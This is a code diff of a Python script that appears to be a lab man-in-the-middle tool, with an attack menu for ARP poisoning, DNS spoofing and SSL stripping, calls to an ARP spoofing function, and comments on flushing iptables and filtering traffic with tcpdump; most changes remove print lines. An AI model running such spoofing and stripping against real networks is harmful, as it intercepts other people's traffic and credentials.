@@ -8,7 +8,7 @@ import sys
 import threading
 import atexit
 import signal
-import tkinter as tk
+import Tkinter as tk
 
 '''
 # global variable for the MITM thread
@@ -66,17 +66,7 @@ def main():
     macVictimLAN = devicesListLAN[0]['mac']
     ipServerLAN = devicesListLAN[1]['ip']
     macServerLAN = devicesListLAN[1]['mac']
-    print(interfaceNAT)
-    print(interfaceLAN)
 
-    print("Please choose an attack:")
-    print("A. ARP Poisoning")
-    print("B. DNS Spoofing")
-    print("C. ARP Listener")
-    print("D. ARP MITM")
-    print("E. SSL Stripping")
-    attack = raw_input("Enter your choice: ")
-    print("\n\n\n")
     # print("Please choose an attack:")
     # print("A. ARP Poisoning")
     # print("B. DNS Spoofing")
@@ -363,10 +353,6 @@ def main():
         arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT, checked)
 
     def ssl():
-        print("MITM ...")
-        arp_thread = threading.Thread(target=arp_mitm_gateway.spoof, args=(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT))
-        arp_thread.start()
-
         print("SSL Stripping...")
         # Perform Man-in-the-Middle using a separate thread 
         mitm = threading.Thread(\
@@ -410,22 +396,12 @@ if __name__ == "__main__":
 '''
     print(interfaceNAT) # enp0s8
     print(interfaceLAN) # enp0s3
-    print("#######################################")
-    # print(recon.scan_network(interfaceNAT))
-    print("Target IP LAN(M1): {}".format(ipVictimLAN))
-    print("Target MAC LAN(M1): {}\n".format(macVictimLAN))
-    print("Gateway(Server) LAN IP (M2): {}".format(ipServerLAN))
-    print("Gateway(Server) LAN MAC (M2): {}\n".format(macServerLAN))
-    print("Attacker IP (M3) LAN: {}".format(ipAttackerLAN))    
-    print("Attacker MAC (M3) LAN: {}\n".format(macAttackerLAN))
-    print("Target IP NAT(M1): {}".format(ipVictimNAT))
-    print("Target MAC NAT(M1): {}\n".format(macVictimNAT))
-    print("Gateway(Server) NAT IP (M2): {}".format(ipGateway))
-    print("Gateway(Server) NAT MAC (M2): {}\n".format(macGateway))
-    print("Attacker IP (M3) NAT: {}".format(ipAttackerNAT))    
-    print("Attacker MAC (M3) NAT: {}".format(macAttackerNAT))
-    print("#######################################\n\n\n")
 
+
+# ps aux | grep python
+# sudo kill -9 <pid>
+# sudo iptables --flush
+# sudo iptables -t nat --flush
 
 use tcpdump to filter traffic by port and host:
 
@@ -436,10 +412,6 @@ sudo tcpdump -i enp0s8 -n port 80 and host 10.0.2.9
 
 '''
 
-# ps aux | grep python
-# kill -9 <pid>
-# sudo iptables --flush
-# sudo iptables -t nat --flush
 
 
 
